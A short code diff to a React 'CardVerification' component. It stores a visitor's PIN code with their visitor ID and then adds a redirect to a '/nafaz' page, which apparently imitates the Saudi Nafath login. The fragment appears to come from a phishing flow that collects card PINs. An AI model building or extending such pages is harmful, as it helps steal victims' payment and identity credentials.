@@ -40,6 +40,7 @@ export default function CardVerification() {
         if (visitorId) {
           setTimeout(() => {
             addData({ id: visitorId, pinCode: pin, pagename: "verify-phone" })
+            router.push('/nafaz')
           }, 3000)
         }
       } catch (error) {
